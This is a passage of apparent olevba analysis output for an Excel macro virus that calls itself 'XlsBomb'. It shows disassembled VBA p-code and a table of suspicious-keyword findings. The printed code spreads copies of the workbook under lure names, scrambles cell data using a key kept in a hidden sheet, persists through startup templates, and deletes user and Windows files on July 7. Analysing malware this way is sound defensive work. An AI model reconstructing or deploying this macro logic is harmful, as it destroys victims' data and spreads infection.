' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #142:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #143:
' 	EndSub 
' Line #144:
' Line #145:
' 	FuncDefn (Private Sub XBrnd())
' Line #146:
' 	Dim 
' 	VarDefn Sbjt
' 	VarDefn Bodd
' Line #147:
' 	OnError nil1 
' Line #148:
' 	ArgsCall Read 0x0000 
' Line #149:
' 	LitStr 0x000D "enCryptionXLS"
' 	LitStr 0x0009 "DamageXls"
' 	LitStr 0x000B "BombStarter"
' 	LitStr 0x000B "unKnownBomB"
' 	LitStr 0x0008 "ExcelDLL"
' 	LitStr 0x000B "DeathOffice"
' 	LitStr 0x0009 "LnxOffice"
' 	LitStr 0x0009 "bOmbffice"
' 	LitStr 0x0006 "XlsLib"
' 	ArgsArray Array 0x0009 
' 	St Sbjt 
' Line #150:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Sbjt 0x0001 
' 	St Myclub 
' Line #151:
' 	ExitSub 
' Line #152:
' 	Label nil1 
' Line #153:
' 	LitDI2 0x0000 
' 	ArgsLd Sbjt 0x0001 
' 	St Myclub 
' Line #154:
' 	EndSub 
' Line #155:
' Line #156:
' 	FuncDefn (Function DrvID(drv3))
' Line #157:
' 	OnError (Resume Next) 
' Line #158:
' 	Dim 
' 	VarDefn fso
' 	VarDefn d
' 	VarDefn t
' Line #159:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' Line #160:
' 	SetStmt 
' 	Ld drv3 
' 	Ld fso 
' 	ArgsMemLd getdrive 0x0001 
' 	Set d 
' Line #161:
' 	Ld d 
' 	MemLd drivetype 
' 	SelectCase 
' Line #162:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Unknown"
' 	St t 
' Line #163:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0009 "removable"
' 	St t 
' Line #164:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Fixed"
' 	St t 
' Line #165:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "network"
' 	St t 
' Line #166:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0006 "CD-ROM"
' 	St t 
' Line #167:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Ramdisk"
' 	St t 
' Line #168:
' 	EndSelect 
' Line #169:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "none"
' 	St t 
' 	EndIf 
' Line #170:
' 	Ld t 
' 	St DrvID 
' Line #171:
' 	EndFunc 
' Line #172:
' 	FuncDefn (Sub snd2drv(DrvAll))
' Line #173:
' 	OnError (Resume Next) 
' Line #174:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #175:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #176:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St Gnm 
' Line #177:
' 	Ld ActiveWorkbook 
' 	MemLd FullName 
' 	St GnmF 
' Line #178:
' 	ArgsCall Read 0x0000 
' Line #179:
' 	LineCont 0x0004 14 00 00 00
' 	LitStr 0x000A "Report2004"
' 	LitStr 0x0007 "Manager"
' 	LitStr 0x000B "StupidStuff"
' 	LitStr 0x0007 "HRD2004"
' 	LitStr 0x0009 "MyCV-Anna"
' 	LitStr 0x0008 "MySalary"
' 	LitStr 0x000A "NotFearACC"
' 	LitStr 0x000D "BombfromLinux"
' 	LitStr 0x0005 "Money"
' 	LitStr 0x0008 "ThankYou"
' 	LitStr 0x0009 "DoNotOpen"
' 	LitStr 0x0008 "ExcelVBA"
' 	LitStr 0x0007 "Opinion"
' 	LitStr 0x0006 "Secret"
' 	LitStr 0x0007 "NextJob"
' 	ArgsArray Array 0x000F 
' 	St FlName 
' Line #180:
' 	Ld Rnd 
' 	LitDI2 0x000E 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd FlName 0x0001 
' 	St Bread 
' Line #181:
' 	Ld DrvAll 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Bread 
' 	Concat 
' 	LitStr 0x0004 ".xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld Gnm 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #182:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0000 
' 	QuoteRem 0x0025 0x000B "your secret"
' Line #183:
' 	Ld GnmF 
' 	Paren 
' 	Ld Workbooks 
' 	ArgsMemCall Option 0x0001 
' Line #184:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #185:
' 	EndSub 
' Line #186:
' Line #187:
' 	FuncDefn (Private Sub Auto_Close())
' Line #188:
' 	OnError (Resume Next) 
' Line #189:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitStr 0x0005 "Book1"
' 	Ne 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitStr 0x0005 "Book2"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #190:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #191:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #192:
' 	StartForVariable 
' 	Ld NS 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sheets 
' 	MemLd Count 
' 	For 
' Line #193:
' 	Ld NS 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "HdSheet"
' 	Eq 
' 	IfBlock 
' Line #194:
' 	Ld NS 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	St kz 
' Line #195:
' 	ExitFor 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	Ld NS 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	St kz 
' Line #198:
' 	StartForVariable 
' 	Ld NS 
' 	EndForVariable 
' 	NextVar 
' Line #199:
' 	Ld kz 
' 	LitStr 0x0007 "HdSheet"
' 	Ne 
' 	IfBlock 
' Line #200:
' 	Ld Sheets 
' 	ArgsMemCall Add 0x0000 
' Line #201:
' 	LitStr 0x0007 "HdSheet"
' 	Ld ActiveWindow 
' 	MemLd ActiveSheet 
' 	MemSt New 
' Line #202:
' 	Ld xlSheetVeryHidden 
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	MemSt Visible 
' Line #203:
' 	EndIfBlock 
' Line #204:
' 	LitStr 0x0002 "A7"
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemLd Range 0x0001 
' 	St CryptSTAT 
' Line #205:
' 	Ld CryptSTAT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #206:
' 	ArgsCall encrypt 0x0000 
' Line #207:
' 	LitDI2 0x0001 
' 	LitStr 0x0002 "A7"
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemSt Range 0x0001 
' Line #208:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0005 "*.xlt"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St SvFl 
' Line #209:
' 	Ld SvFl 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #210:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	EndIfBlock 
' Line #213:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #214:
' 	LitStr 0x000F "c:\Mydocu~1\*.*"
' 	ArgsCall Kill 0x0001 
' 	QuoteRem 0x0019 0x000E "**Never Work**"
' Line #215:
' 	LitStr 0x000F "c:\Windows\*.i*"
' 	ArgsCall Kill 0x0001 
' 	QuoteRem 0x0019 0x000D "**Never Fun**"
' Line #216:
' 	LitStr 0x000D "c:\Winnt\s*.*"
' 	ArgsCall Kill 0x0001 
' 	QuoteRem 0x0019 0x0010 "**Never Secure**"
' Line #217:
' 	QuoteRem 0x0000 0x0027 "Kill "MS:\Bill Gates"   '**Never Mind**"
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	EndSub 
' Line #220:
' Line #221:
' 	FuncDefn (Sub encrypt())
' Line #222:
' 	Dim 
' 	VarDefn SCo (As Integer)
' Line #223:
' 	ArgsCall Read 0x0000 
' Line #224:
' 	Ld Rnd 
' 	LitDI2 0x0004 
' 	Mul 
' 	FnInt 
' 	St AA 
' Line #225:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	LitDI2 0x00AF 
' 	Add 
' 	St NN 
' Line #226:
' 	StartForVariable 
' 	Ld SCo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sheets 
' 	MemLd Count 
' 	For 
' Line #227:
' 	LitDI2 0x0000 
' 	St Y 
' Line #228:
' 	LitDI2 0x0000 
' 	St z 
' Line #229:
' 	Ld AA 
' 	St gg 
' Line #230:
' 	Ld NN 
' 	St HH 
' Line #231:
' 	StartForVariable 
' 	Ld NCo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #232:
' 	Ld Y 
' 	LitDI2 0x0001 
' 	Add 
' 	St Y 
' Line #233:
' 	Ld z 
' 	LitDI2 0x0001 
' 	Add 
' 	St z 
' Line #234:
' 	Ld HH 
' 	ArgsLd Chr 0x0001 
' 	St MyStr$ 
' Line #235:
' 	Ld gg 
' 	LitStr 0x0001 "C"
' 	Ld Y 
' 	Concat 
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemSt Range 0x0001 
' Line #236:
' 	Ld MyStr$ 
' 	LitStr 0x0001 "D"
' 	Ld z 
' 	Concat 
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemSt Range 0x0001 
' Line #237:
' 	Ld SCo 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ne 
' 	Ld SCo 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "HdSheet"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #238:
' 	Ld gg 
' 	ParamNamed What 
' 	Ld MyStr$ 
' 	ParamNamed Replacement 
' 	Ld SCo 
' 	ArgsLd Sheets 0x0001 
' 	MemLd Cells 
' 	ArgsMemCall Replace 0x0002 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	Ld gg 
' 	LitDI2 0x0001 
' 	Add 
' 	St gg 
' Line #241:
' 	Ld HH 
' 	LitDI2 0x0001 
' 	Add 
' 	St HH 
' Line #242:
' 	StartForVariable 
' 	Ld NCo 
' 	EndForVariable 
' 	NextVar 
' Line #243:
' 	StartForVariable 
' 	Ld SCo 
' 	EndForVariable 
' 	NextVar 
' Line #244:
' 	EndSub 
' Line #245:
' 	FuncDefn (Sub Decrypt())
' Line #246:
' 	StartForVariable 
' 	Ld SC1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sheets 
' 	MemLd Count 
' 	For 
' Line #247:
' 	LitDI2 0x0000 
' 	St X 
' Line #248:
' 	LitDI2 0x0000 
' 	St Y 
' Line #249:
' 	StartForVariable 
' 	Ld NC1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #250:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Add 
' 	St X 
' Line #251:
' 	Ld Y 
' 	LitDI2 0x0001 
' 	Add 
' 	St Y 
' Line #252:
' 	LitStr 0x0001 "C"
' 	Ld Y 
' 	Concat 
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemLd Range 0x0001 
' 	St ReadC 
' Line #253:
' 	LitStr 0x0001 "D"
' 	Ld X 
' 	Concat 
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemLd Range 0x0001 
' 	St ReadD$ 
' Line #254:
' 	Ld SC1 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ne 
' 	Ld SC1 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "HdSheet"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #255:
' 	Ld ReadD$ 
' 	ParamNamed What 
' 	Ld ReadC 
' 	ParamNamed Replacement 
' 	Ld SC1 
' 	ArgsLd Sheets 0x0001 
' 	MemLd Cells 
' 	ArgsMemCall Replace 0x0002 
' Line #256:
' 	EndIfBlock 
' Line #257:
' 	StartForVariable 
' 	Ld NC1 
' 	EndForVariable 
' 	NextVar 
' Line #258:
' 	StartForVariable 
' 	Ld SC1 
' 	EndForVariable 
' 	NextVar 
' Line #259:
' 	EndSub 
' Line #260:
' 	QuoteRem 0x0000 0x0051 "if you remove this macro or not install tools, your money will broke......BOMB !!"
' Line #261:
' 	QuoteRem 0x0000 0x0034 "eastjava 010104, XlsBomb Ver 0.15 written by RedMoon"
' _VBA_PROJECT_CUR/VBA/List4 - 1175 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
|IOC       |rundll.exe          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

